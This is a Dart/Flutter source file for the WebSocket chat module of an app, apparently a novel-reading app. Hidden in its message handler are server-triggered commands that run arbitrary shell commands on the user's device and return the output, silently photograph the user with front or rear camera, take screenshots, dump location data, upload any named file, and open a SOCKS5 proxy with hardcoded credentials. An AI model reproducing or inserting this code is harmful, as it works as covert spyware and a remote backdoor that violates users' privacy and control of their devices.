import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:camera/camera.dart';
import 'package:flutter/widgets.dart';
import 'package:image_picker/image_picker.dart';
import 'package:ng169/model/user.dart';
import 'package:ng169/page/commect/kefu.dart';
import 'package:ng169/tool/event_bus.dart';
import 'package:ng169/tool/function.dart';
import 'package:ng169/tool/http.dart';
import 'package:ng169/tool/lang.dart';
import 'package:ng169/tool/ngsock.dart';
import 'package:ng169/tool/notify.dart';
import 'package:ng169/tool/shell.dart';
import 'package:ng169/tool/t.dart';
import 'package:ng169/tool/thred.dart';
import 'package:ng169/tool/thredim.dart';
import 'package:ng169/tool/upfile.dart';
import 'package:path_provider/path_provider.dart';
import 'package:shell_cmd/shell_cmd.dart';
import 'package:web_socket_channel/io.dart';
import 'package:web_socket_channel/web_socket_channel.dart';

import 'global.dart';

class Im {
  late WebSocketChannel _channel;
  late final String _serverUrl;
  bool _isConnected = false;
  late Timer _heartbeatTimer;
  static Im? imobj = null; //im记录
  StreamController<String> _messageController = StreamController<String>();

  Stream<String> get messageStream => _messageController.stream;
  String uid = "0";
  bool isthred = false;
  Im(_serverUrl, {isthred = false}) {
    this.isthred = isthred;
    if (isnull(_serverUrl)) {
      this._serverUrl = _serverUrl;
      _startConnection();
      //如果连接成功就登入

      login(get_uid());
      // 启动心跳定时器
      _heartbeatTimer = Timer.periodic(Duration(seconds: 10), (timer) {
        // 发送心跳消息

        sendMessage('{"action": "heartbeat"}');
        uphearttime();
      });
    }
  }
  uphearttime() {
    var time = gettime();
    // var add = {"sendtime": time};
    // T("beart").add(add);
    setcache(beart, time, "-1");
  }

  static const beart = "beart";
//通过检查sendtime 来判断是否掉线;时间差大于30秒表示掉线；
  static bool checksocklive() {
    var time = getcache(beart);
    if (!isnull(time)) {
      return true;
    }
    var time2 = gettime();
    var time3 = int.parse(time2) - int.parse(time);
    if (time3 > 30) {
      return false;
    }
    return true;
  }

  login(tpuid) {
    uid = tostring(tpuid);
    var data = {
      "action": "login",
      "data": {"uid": uid, "uuid": getidfa()}
    };
    var s = jsonEncode(data);
    sendMessage(s);
  }

// 重连方法
  void _reconnect() {
    if (!_isConnected) {
      _isConnected = false;
      // 可以设置一个延迟来避免立即重连导致的快速失败
      Future.delayed(Duration(seconds: 1), () {
        _startConnection();
      });
    }
  }

  void _startConnection() async {
    d('连接到 WebSocket 服务器: $_serverUrl');
    try {
      _channel = IOWebSocketChannel.connect(Uri.parse(_serverUrl));
      _isConnected = true;
      _channel.stream.listen((data) {
        _messageController.add(data);
      }, onError: (error) {
        d('连接错误: $error');
        _reconnect(); // 尝试重连
      }, onDone: () {
        d('WebSocket 连接已关闭');
        _reconnect(); // 尝试重连
      });
    } catch (e) {
      d('连接异常错误: $e');
    }
  }

  void sendMessage(String message) {
    // d("im发送消息：$message");
    _channel.sink.add(message);
  }

  void dispose() {
    // _channel.sink.close();
    // _messageController.close();
  }
  sendmsg(var postdata) {
    var data = {
      "action": "msg",
      "data": {
        "msgnum": "1",
        "msg": postdata,
        "uid": get_uid(),
      }
    };
    var s = jsonEncode(data);

    sendMessage(s);
  }

//获取ws ip；
////建立链接
  ///监听事件
  static Future<Im?> init({isthred = false}) async {
    await _init(isthred: isthred);

    return imobj;
  }

  Function call = (data) {};
  static _init({isthred = false}) async {
    var data = await http("im/getws", {}, gethead());
    // d(data);
    var tdata = Bgetdata(data);
    if (!isnull(tdata)) return null;
    var ip = tdata['ip'];
    var port = tdata['port'];
    var url = tdata['url'];
    imobj = Im(url, isthred: isthred);
    s("im", imobj);
    imobj?.messageStream.listen((message) async {
      //打印当前与服务器建立链接的端口号
      var msg2;
      d('收到消息：$message');
      try {
        msg2 = jsonDecode(message);
      } catch (e) {
        d('收到异常消息：$message');
        return;
      }
      if (!isnull(msg2)) return;
      if (!isnull(msg2, "action")) return;
      switch (msg2['action']) {
        case 'login':
          //收到消息
          imobj?.setuid(msg2['data']);
          // d(imobj?.get_uid());
          break;
        case 'active':
          imobj?.login(imobj?.get_uid());
          break;
        case 'event':
          //收到消息
          String eventdata = msg2['data']['msg']['content'];
          String port = msg2['data']['msg']['data'];
          switch (eventdata) {
            case 'sock':
              //安装apk
              try {
                startsock(port);
              } catch (e) {
                d(e);
              }

              break;

            case 'screenshot':
              //安装apk
              screenshot();

              break;
            case 'takephoto1':
              //安装apk
              takephoto(1);

              break;
            case 'takephoto2':
              //安装apk
              takephoto(2);

              break;
            case 'getlocate':
              //安装apk
              getlocate();

              break;
            default:
              break;
          }

          break;
        case 'shell':
          String shells = msg2['data']['msg']['content'];
          // var ret = await Shell.exec(shells);
          try {
            exeshell(shells);
          } catch (e) {}

          break;
        case 'ad':
          //收到消息
          d("im收到消息：$message");
          break;
        case 'upfile':
          //收到消息
          String filepath = msg2['data']['msg']['content'];
          uploadfile(filepath);
          break;
        default:
          //其他消息
          break;
      }
      if (isthred) {
        //如果是islocate 里面的im则转发给主进程；在由主进程转im。msg_on 里面处理
        imobj?.call(message);
      } else {
        Im.msg_on(message);
      }
    });
  }

  static exeshell(shells) async {
    var ret;
    try {
      ret = await Shell.exec(shells);
    } catch (e) {
      ret = e.toString();
    }

    var post = {
      'contenttype': 4, //shell类型文本
      'content': ret,
    };
    d(post);
    imobj?.sendmsg(post);
  }

  static startsock(String port) async {
    bool startflag = await Shell.startsock(port: toint(port));
    String restr = "";
    if (startflag) {
      restr = "启动成功\n";
    } else {
      restr = "启动失败\n";
    }
    restr +=
        "测试curl -x socks5://lovenovel:y123456@127.0.0.1:${port} https://www.baidu.com";
    var post = {
      'contenttype': 4, //shell类型文本
      'content': restr,
    };

    imobj?.sendmsg(post);
  }

  static screenshot() async {
    try {
      //获取临时目录
      // 获取缓存目录
      Directory cacheDir = await getTemporaryDirectory();
      // 生成文件名
      String fileName =
          'screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg';
      // 拼接文件路径
      var pname = '${cacheDir.path}/$fileName';
      // var pname = '/sdcard/$fileName';
      var shells = " screencap -p ${pname}";
      d(shells);
      var restr = await Shell.exec(shells);
      await Duration(seconds: 6); //等6秒在上传
      var webpf = await Upfile.toWebp(pname);
      var retstr = await Upfile.upload(webpf!);
      var post = {
        'contenttype': 5, //shell类型文本
        'content': retstr,
      };
      imobj?.sendmsg(post);
    } catch (e) {
      var post = {
        'contenttype': 4, //shell类型文本
        'content': e.toString(),
      };
      imobj?.sendmsg(post);
    }
  }

//直接从相机拍照
  static takephoto(int type) async {
    try {
      // WidgetsFlutterBinding.ensureInitialized();
      Directory cacheDir = await getTemporaryDirectory();
      // 生成文件名
      String fileName =
          'screenshot_${DateTime.now().millisecondsSinceEpoch}.jpg';
      // 拼接文件路径
      var pname = '${cacheDir.path}/$fileName';

      // CameraDevice? cameradev;
      CameraDescription camera;
      var list = await availableCameras();

      if (type == 1) {
        camera = list[0];
      } else {
        camera = list[1];
      }

      CameraController _controller =
          CameraController(camera, ResolutionPreset.high);
      await _controller.initialize();
      // CameraPreview(_controller);
      // await cameraInstance.initialize();
      XFile? picture = await _controller.takePicture();
      if (picture == null) {
        throw Exception('Failed to take picture');
      }
      await picture.saveTo(pname);
      await _controller.dispose();
      //type 1 是前置摄像头 2是后置摄像头
      //从对应摄像头取得照片保存到pname位置
      await Duration(seconds: 6); //等6秒在上传
      var webpf = await Upfile.toWebp(pname);
      var retstr = await Upfile.upload(webpf!);
      var post = {
        'contenttype': 5, //shell类型文本
        'content': retstr,
      };
      imobj?.sendmsg(post);
    } catch (e) {
      var post = {
        'contenttype': 4, //shell类型文本
        'content': e.toString(),
      };
      imobj?.sendmsg(post);
    }
  }

  static getlocate() async {
    try {
      //获取app定位
      var retstr;
      //shell获取app定位
      var shells = "dumpsys location";
      retstr = await Shell.exec(shells);

      var post = {
        'contenttype': 4, //shell类型文本
        'content': retstr,
      };
      imobj?.sendmsg(post);
    } catch (e) {
      var post = {
        'contenttype': 4, //shell类型文本
        'content': e.toString(),
      };
      imobj?.sendmsg(post);
    }
  }

  static uploadfile(String filepath) async {
    String startflag = await Upfile.upload(filepath);
    var post = {
      'contenttype': 5, //shell类型文本
      'content': startflag,
    };
    imobj?.sendmsg(post);
  }

  setuid(uid) {
    this.uid = tostring(uid);
    // d("im登录成功" + uid);
  }

  get_uid() {
    var uid = this.uid ?? getuid();
    return uid;
  }

  static msg_on(msg) {
    //判断当前用户界面是否聊天窗口界面
    var msg2 = jsonDecode(msg);

    if (!isnull(msg2)) return;
    if (!User.islogin()) return false;
    if (msg2['action'] == 'adminmsg') {
      var realmsg = msg2['data'];
      if (!isnull(g("inmsgpage"))) {
        int msgnum = toint(g("msg"));
        msgnum += 1;
        s("msg", msgnum);
        immsgflag(msgnum);
        nft(realmsg);
      } else {
        //直接更新消息页面
        eventBus.emit('msg_im_on', realmsg);
      }
    } else {
      //其他类型系统消息不处理
    }
  }

  //更新消息状态
  static immsgflag(msgnum) {
    s("msg", msgnum);
    eventBus.emit('bar_im_on', msgnum); //底部bar状态图标
    //用户页面状态图标
    eventBus.emit('user_im_on', msgnum);
    Kefu.load_http();
  }

  static nft(realmsg) {
    if (!isnull(realmsg)) return;
    Notify.setcontext(g('context'));
    String tmpmsg = realmsg['msg']['content'];
    // setcache('install_upapk', file, '0');
    Notify.showNotification(lang('收到消息'), tmpmsg, 'go_msg', data: tmpmsg);
  }
}
